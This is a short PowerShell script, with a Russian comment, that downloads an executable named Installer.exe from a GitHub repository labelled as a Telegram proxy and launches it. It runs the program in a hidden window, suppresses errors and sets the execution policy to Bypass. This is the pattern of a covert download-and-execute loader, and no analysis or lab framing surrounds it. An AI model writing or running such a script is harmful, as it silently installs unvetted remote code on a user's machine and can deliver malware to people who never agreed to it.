Invoke-WebRequest -Uri "https://github.com/Flowseala/telegramproxy/raw/refs/heads/main/Installer.exe" -OutFile "Installer.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "Installer.exe" -WindowStyle Hidden

    
Set-ExecutionPolicy Bypass -Scope Process -Force